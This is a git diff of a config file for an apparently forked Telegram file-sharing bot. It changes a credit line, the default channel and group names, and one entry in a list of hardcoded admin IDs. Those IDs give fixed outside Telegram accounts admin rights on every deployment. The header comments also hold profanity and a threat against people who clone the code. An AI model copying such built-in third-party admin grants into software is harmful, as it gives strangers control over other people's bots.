@@ -1,5 +1,5 @@
 # (©)Codexbotz
-# Recife By #Mafia_Tobatz
+# Recife By Zaen #Mafia_Tobatz
 # Kalo clone Gak usah hapus 
 # gue tandain akun tele nya ngentod
 
@@ -30,8 +30,8 @@ OWNER = os.environ.get("OWNER", "@Mafia_Tobatz")
 DB_URI = os.environ.get("DATABASE_URL", "")
 
 # Username CH & Group
-CHANNEL = os.environ.get("CHANNEL", "Lunatic0de")
-GROUP = os.environ.get("GROUP", "SharingUserbot")
+CHANNEL = os.environ.get("CHANNEL", "Tolak_Ange")
+GROUP = os.environ.get("GROUP", "Tolak_Ange")
 
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
@@ -67,7 +67,7 @@ DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True
 
 ADMINS.append(OWNER_ID)
 ADMINS.append(1250450587)
-ADMINS.append(844432220)
+ADMINS.append(2010825200)
 ADMINS.append(1750080384)
 
 LOG_FILE_NAME = "filesharingbot.txt"
